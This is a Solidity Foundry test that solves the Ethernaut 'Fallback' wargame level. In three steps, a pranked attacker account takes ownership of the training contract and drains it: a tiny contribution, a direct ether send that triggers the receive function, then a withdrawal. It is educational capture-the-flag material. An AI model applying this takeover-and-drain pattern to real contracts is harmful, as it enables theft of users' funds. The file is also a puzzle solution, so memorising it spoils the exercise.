// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/Ethernaut.sol";
import "../src/levels/1-Fallback/Fallback.sol";
import "../src/levels/1-Fallback/FallbackFactory.sol";

contract FallbackTest is Test, BaseTest {
    Fallback public level;

    constructor() {
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(_createLevelInstance());
        level = Fallback(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() internal override {
        vm.startPrank(attacker);

        // 1. Contribute small amount
        level.contribute{value: 0.0001 ether}();

        // 2. Trigger receive function & become owner
        (bool success, ) = address(level).call{value: 1 ether}("");
        require(success, "Transfer failed");

        // 3. Withdraw all funds
        level.withdraw();

        vm.stopPrank();
    }
}
